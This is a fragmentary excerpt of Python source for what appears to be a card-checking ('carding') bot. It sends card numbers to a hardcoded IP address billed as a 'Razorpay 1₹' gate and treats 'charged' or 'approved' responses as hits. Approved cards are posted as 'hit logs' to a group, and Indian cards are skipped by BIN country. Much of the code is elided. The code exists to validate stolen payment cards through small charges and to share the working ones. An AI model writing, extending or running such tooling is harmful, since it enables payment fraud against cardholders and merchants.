...
RZ_API_URL = "http://177.7.48.46:1000/razorpay/cc="
...
# Razorpay API usually returns JSON with status 'charged' or 'approved'
RZ_APPROVED_STATUSES = ["charged", "approved"]
...
def ensure_stats_columns():
    ...
    try:
        ...
        conn.commit()
        conn.close()
        logging.info("[DB] RZ Stats columns checked/created.")
...
def is_india_card(bin_info: dict) -> bool:
    """
    Checks if the card is from India based on BIN info.
    Checks both country name and country code.
    """
    country_name = bin_info.get("country", "").lower()
    country_code = bin_info.get("country_code", "").upper()
    
    # Check country name contains "india"
    if "india" in country_name:
        return True
    
    # Check country code is "IN" (India's ISO code)
    if country_code == "IN":
        return True
...
async def send_hit_log_to_group(bot: Bot, response_msg, user_obj, plan_emoji, status_type="CHARGED"):
    """
    Sends hit log to the designated group for approved cards.
    Format updated per user request.
    """
    ...
    try:
        ...
        logging.info(f"[RZ] Hit log sent to group - Status: {status_type}")
    except Exception as e:
        logging.error(f"[RZ] Error sending hit log to group: {e}")
...
async def process_rz_check(message, proc_msg, user, user_id, formatted_cc, cc):
    """
    Handles the Razorpay API calls, DB updates, and final message editing.
    """
    ...
    # C. India Card Check (Logic specific to RZ)
    if is_india_card(bin_info):
        api_result = {"status": "declined", "response": "[RISK_CONTROL] / REGION_BLOCKED"}
    else:
        # D. API Call (Razorpay)
        api_result = {"status": "error", "response": "Unknown Error"}
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"{RZ_API_URL}{formatted_cc}", timeout=90) as resp:
                    if resp.status == 200:
            ...
            logging.error(f"Razorpay API Timeout")
    ...
    is_approved = status_raw in RZ_APPROVED_STATUSES
    ...
    if is_approved:
        try:
            ...
            logging.error(f"[RZ] Failed to send hit log: {e}")

    # J. Build Final Caption Elements
    ...
    gate_text = to_small_caps("Razorpay 1₹")
    ...
    # L. Edit the Processing Message with Result
    try:
